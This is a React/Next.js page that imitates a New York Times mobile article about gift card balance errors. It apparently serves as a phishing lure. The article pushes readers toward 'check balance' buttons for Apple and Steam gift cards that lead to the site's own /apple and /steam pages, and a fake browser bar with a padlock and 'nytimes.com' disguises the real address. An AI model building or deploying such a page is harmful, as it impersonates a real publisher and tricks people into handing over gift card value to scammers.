import { useState, useRef } from 'react'
import Head from 'next/head'
import styles from '../styles/nyt.module.css'

export default function NytHome() {
  const [isPlaying, setIsPlaying] = useState(false)
  const audioRef = useRef(null)

  const togglePlay = () => {
    if (!audioRef.current) return

    if (isPlaying) {
      audioRef.current.pause()
    } else {
      audioRef.current.play()
    }
    setIsPlaying(!isPlaying)
  }

  return (
    <div className={styles.nytPage}>
      <Head>
        <title>The New York Times - Breaking News</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
      </Head>

      {/* App Installation Top Bar */}
      <div className={styles.appBanner}>
        <div className={styles.nytIcon}>T</div>
        <div className={styles.bannerText}>
          <p className={styles.bannerTitle}>NYTimes: Breaking W...</p>
          <p className={styles.bannerSubtitle}>Global and Australian New...</p>
        </div>
        <div style={{ textAlign: 'center', marginRight: '10px' }}>
          <button className={styles.getBtn}>Get</button>
          <span style={{ display: 'block', fontSize: '8px', color: '#666', marginTop: '2px' }}>In-App Purchases</span>
        </div>
        <button className={styles.closeBtn}>×</button>
      </div>

      {/* Header */}
      <header className={styles.header}>
        <div className={styles.headerTop}>
          <div className={styles.menuIcon}>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M4 6h16M4 12h16M4 18h16" />
            </svg>
          </div>
          <div className={styles.nytLogo}>
            <svg viewBox="0 0 1000 135" fill="currentColor">
              <path d="M912.8 33.2c-4.4-1.3-8.8-1.5-13.4-0.6 -4.6 0.9-8.7 2.9-12.7 5.7 -4.1 2.8-7.7 6.4-10.8 11.1 -3.1 4.7-6 10.3-8.8 16.7 -2.8 6.4-5.3 13.6-7.8 21.6 -2.4 8.1-4.7 16.6-6.8 25.5 -2.1 8.9-4.2 18-6.1 27.2L841 141.2c5.9 0 11.5-1.1 16.7-3.2 5.2-2.1 9.6-5.1 13.1-9s6-8.5 7.6-13.8 2.3-10.9 2.3-16.9v-2.3c0-6 0.1-12.1 0.4-18.4s0.6-12.7 1-19.1c0.4-6.4 1-12.8 1.8-19s1.8-12.4 2.9-18.4c1.2-6 2.6-11.7 4.1-17.1s3.3-10.4 5.3-15c2-4.6 4.3-8.6 6.8-11.9S908.4 34.5 912.8 33.2zM425.8 45.4h-31.5c1.4-1.1 2.9-2.2 4.6-3.1 1.6-1 3.5-1.9 5.5-2.7 2-0.8 4.2-1.4 6.5-1.8 2.3-0.4 4.8-0.6 7.4-0.6h7.5V18.1h-44.1v17.4h7.5c2.6 0 5.1 0.2 7.4 0.6 2.3 0.4 4.5 1 6.5 1.8 2 0.8 3.9 1.7 5.5 2.7 1.6 1 3.1 2 4.6 3.1h-31.5L343.9 160.8V174c0 3 0.7 5.5 2.1 7.2 1.4 1.7 3.5 3 6.4 3.7 2.8 0.7 6.1 1.1 10 1.2s8.2 0.2 12.8 0.2c4.6 0 8.9-0.1 12.8-0.2s7.1-0.5 10-1.2c2.8-0.7 4.9-1.9 6.4-3.7s2.1-4.3 2.1-7.2v-13.3L425.8 45.4zM242.2 45.4h-28.7c1.3-1.1 2.6-2.2 4.2-3.1 1.5-1 3.2-1.9 5-2.7 1.8-0.8 3.8-1.4 5.9-1.8 2.1-0.4 4.4-0.6 6.8-0.6h7.5V18.1H188v17.4h7.5c2.4 0 4.7 0.2 6.8 0.6s4.1 1 5.9 1.8c1.8 0.8 3.5 1.7 5 2.7 1.5 1 2.9 2 4.2 3.1H188c-12 0-22.9 2.2-32.8 6.6 -9.9 4.4-18.4 10.6-25.5 18.5s-12.7 17.1-16.7 27.6 -6.1 21.6-6.1 33.3c0 11.7 2.1 22.8 6.1 33.3s9.6 19.8 16.7 27.6c7.1 7.9 15.6 14.1 25.5 18.5 9.9 4.4 20.9 6.6 32.8 6.6h54.3V160.8h-7.5c-2.4 0-4.7-0.2-6.8-0.6 -2.1-0.4-4.1-1-5.9-1.8 -1.8-0.8-3.5-1.7-5-2.7 -1.5-1-2.9-2-4.2-3.1h28.7L242.2 45.4zM188.3 160.8c-15.6 1.7-27.1-3.6-34.6-15.7 -7.5-12.2-11.2-27.4-11.2-45.7 0-18.3 3.7-33.5 11.2-45.7 7.5-12.1 19-17.4 34.6-15.7V174h-0.2L188.3 160.8zM572.5 45.4H538c1.5-1.1 3.2-2.2 4.9-3.1 1.7-1 3.7-1.9 5.8-2.7 2.1-0.8 4.3-1.4 6.6-1.8 2.3-0.4 4.8-0.6 7.4-0.6h7.5V18.1h-44.1v17.4h7.5c2.6 0 5.1 0.2 7.4 0.6 2.3 0.4 4.5 1 6.6 1.8s4 1.7 5.8 2.7c1.7 1 3.4 2 4.9 3.1h-34.2L503.4 174c0 3 0.7 5.5 2.1 7.2 1.4 1.7 3.5 3 6.4 3.7 2.8 0.7 6.1 1.1 10 1.2s8.2 0.2 12.8 0.2c4.6 0 8.9-0.1 12.8-0.2s7.1-0.5 10-1.2c2.8-0.7 4.9-1.9 6.4-3.7s2.1-4.3 2.1-7.2L572.5 45.4zM476 18.1V185h44.1v-17.4h-7.5c-2.6 0-5.1-0.2-7.4-0.6 -2.3-0.4-4.5-1-6.6-1.8s-4-1.7-5.8-2.7c-1.7-1-3.4-2-4.9-3.1h0V18.1H476zM735.6 117.1c-2.8-14.8-12-23.7-27.6-26.6 -15.6-2.9-29.2 1.9-40.7 14.5 -11.5 12.6-17.3 28.5-17.3 47.7 0 19.3 5.8 35.1 17.3 47.7s25.2 17.4 40.7 14.5c15.6-2.9 24.8-11.8 27.6-26.6h17.1c-4.1 20.4-16.1 33.1-36 38.1 -19.9 5-38 1-54.2-12.1s-24.3-30.8-24.3-56.2c0-25.4 8.1-43.1 24.3-56.2s34.3-17 54.2-12.1c19.9 5 31.9 17.6 36 38.1H735.6zM613.2 45.4l15.1 128.6h25.4L638.6 45.4H613.2zM634.3 18.1h-21V41h7.5c2.3 0 4.5 0.2 6.5 0.6 2 0.4 3.8 1 5.4 1.8 1.6 0.8 3 1.7 4.3 2.7 1.3 1 2.3 2 3.2 3.1h0V18.1zM805 45.4h-54.3v17.4h7.5c2.4 0 4.7 0.2 6.8 0.6s4.1 1 5.9 1.8 3.5 1.7 5 2.7 2.9 2 4.2 3.1h-54.3L713.4 174c0 3 0.7 5.5 2.1 7.2 1.4 1.7 3.5 3 6.4 3.7 2.8 0.7 6.1 1.1 10 1.2s8.2 0.2 12.8 0.2c4.6 0 8.9-0.1 12.8-0.2s7.1-0.5 10-1.2c2.8-0.7 4.9-1.9 6.4-3.7s2.1-4.3 2.1-7.2L805 45.4zM708.4 18.1V185h44.1v-17.4h-7.5c-2.4 0-4.7-0.2-6.8-0.6s-4.1-1-5.9-1.8 -3.5-1.7-5-2.7c-1.5-1-2.9-2-4.2-3.1h0V18.1H708.4z" />
            </svg>
          </div>
          <div className={styles.accountIcon}>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
            </svg>
          </div>
        </div>

        <div className={styles.subscribeBar}>
          <button className={styles.subscribeBtn}>Subscribe for $1/week</button>
        </div>

        {/* Categories Scroller */}
        <div className={styles.navScroll}>
          <span className={`${styles.navLink} ${styles.active}`}>U.S. Immigration</span>
          <span className={styles.navLink}>Travel Ban</span>
          <span className={styles.navLink}>Immigration Arrests</span>
          <span className={styles.navLink}>Sweeping Changes</span>
        </div>
      </header>

      {/* Article Content */}
      <main className={styles.article}>
        <h1 className={styles.headline}>
          Retailers Load Incorrect Balances on Gift Cards, Leaving Shoppers Short
        </h1>

        <p className={styles.summary}>
          Customers across the U.S. have reported buying $100 gift cards only to discover less money was actually loaded. Consumer advocates say errors at the register and faulty activation systems are to blame, and warn shoppers to always check the balance before leaving the store.
        </p>

        <div className={styles.articleActions}>
          <div className={styles.listenAction} onClick={togglePlay} style={{ cursor: 'pointer' }}>
            <div className={styles.circlePlay}>
              <audio
                ref={audioRef}
                src="/gift-card-glitches.m4a"
                onEnded={() => setIsPlaying(false)}
              />
              {isPlaying ? (
                <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M6 4h4v16H6zM14 4h4v16h-4z" />
                </svg>
              ) : (
                <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M8 5v14l11-7z" />
                </svg>
              )}
            </div>
            <span>Listen to this article · 3:50 min <span className={styles.learnMore}>Learn more</span></span>
          </div>
        </div>

        <div className={styles.articleActions} style={{ border: 'none', gap: '8px' }}>
          <button className={styles.shareBtn}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M4 12v8a2 2 0 002 2h12a2 2 0 002-2v-8m-12-6l6-6 6 6m-6-6v12" />
            </svg>
            Share full article
          </button>
          <div className={styles.iconOverlay}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6M15 3h6v6" />
            </svg>
          </div>
          <div className={styles.iconOverlay}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M19 21l-7-5-7 5V5a2 2 0 012-2h10a2 2 0 012 2z" />
            </svg>
          </div>
          <div className={styles.iconOverlay} style={{ padding: '6px 14px' }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M21 11.5a8.38 8.38 0 01-.9 3.8 8.5 8.5 0 01-7.6 4.7 8.38 8.38 0 01-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 01-.9-3.8 8.5 8.5 0 014.7-7.6 8.38 8.38 0 013.8-.9h.5a8.48 8.48 0 018 8v.5z" />
            </svg>
            <span style={{ fontSize: '12px', marginLeft: '6px' }}>0</span>
          </div>
        </div>

        {/* Redirect Section */}
        <div className={styles.cardSection}>
          <p className={styles.surveyTitle}>Verify your card balance below to ensure full value is present.</p>

          <a href="/apple" className={`${styles.giftCardBtn} ${styles.appleBtn}`}>Check Apple Gift Card Balance</a>
          <a href="/steam" className={`${styles.giftCardBtn} ${styles.steamBtn}`}>Check Steam Wallet Balance</a>

          <div className={styles.surveyBox}>
            <div className={styles.surveyText}>
              Tell us about yourself. <strong>Take the survey.</strong>
            </div>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ccc" strokeWidth="2">
              <path d="M9 18l6-6-6-6" />
            </svg>
          </div>
        </div>
      </main>

      {/* Browser Interaction Mockup */}
      <div className={styles.bottomNav}>
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#333" strokeWidth="1.5">
          <path d="M15 18l-6-6 6-6" />
        </svg>
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#333" strokeWidth="1.5">
          <path d="M9 18l6-6-6-6" />
        </svg>
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px', background: '#e2e2e2', padding: '6px 16px', borderRadius: '12px' }}>
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#333" strokeWidth="2">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
            <path d="M7 11V7a5 5 0 0110 0v4" />
          </svg>
          <span style={{ fontSize: '13px', fontFamily: 'sans-serif' }}>nytimes.com</span>
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#333" strokeWidth="2">
            <path d="M23 4v6h-6M1 20v-6h6" />
            <path d="M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15" />
          </svg>
        </div>
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#333" strokeWidth="1.5">
          <circle cx="12" cy="12" r="1" />
          <circle cx="19" cy="12" r="1" />
          <circle cx="5" cy="12" r="1" />
        </svg>
      </div>
    </div>
  )
}
